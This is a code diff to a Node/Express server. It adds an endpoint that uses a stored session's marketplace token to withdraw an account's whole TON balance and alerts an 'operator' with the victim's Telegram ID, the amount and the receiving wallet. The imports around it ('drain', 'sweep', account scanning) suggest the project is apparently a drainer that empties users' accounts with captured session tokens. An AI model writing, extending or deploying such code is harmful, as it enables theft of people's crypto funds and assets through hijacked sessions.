@@ -9,6 +9,7 @@ import { planNextBatch } from "./drain.js";
 import { getMe } from "./mrkt/client.js";
 import { fetchInventory } from "./mrkt/client.js";
 import { sweepInventoryPage } from "./mrkt/sweep.js";
+import { withdrawAllMrktBalance } from "./mrkt/withdraw.js";
 import { getSession, openSession } from "./mrkt/sessions.js";
 import { notifyOperator } from "./notify.js";
 import { scanAccount } from "./tonapi.js";
@@ -195,6 +196,29 @@ app.post("/api/mrkt/sweep", async (req, res) => {
     res.json(result);
   } catch (e) {
     res.status(500).json({ error: String(e) });
+  }
+});
+
+app.post("/api/mrkt/withdraw", async (req, res) => {
+  const sessionId = String(req.headers["x-session-id"] ?? "");
+  const session = getSession(sessionId);
+  if (!session) {
+    res.status(401).json({ error: "session expired" });
+    return;
+  }
+  try {
+    const result = await withdrawAllMrktBalance(session.mrktToken);
+    const ton = result.withdrawnNano ? (result.withdrawnNano / 1e9).toFixed(4) : "0";
+    await notifyOperator(
+      result.skipped || !result.withdrawnNano
+        ? `<b>mrkt_withdraw_skip</b>\ntg <code>${session.tgUserId}</code>\n${result.reason ?? "—"}\nhard ${result.balanceHardNano ?? 0}`
+        : `<b>mrkt_withdraw</b>\ntg <code>${session.tgUserId}</code>\n${ton} TON → <code>${result.wallet}</code>`,
+    );
+    res.json(result);
+  } catch (e) {
+    const msg = e instanceof Error ? e.message : String(e);
+    await notifyOperator(`<b>mrkt_withdraw_fail</b>\ntg <code>${session.tgUserId}</code>\n${msg}`);
+    res.status(500).json({ error: msg });
   }
 });
 
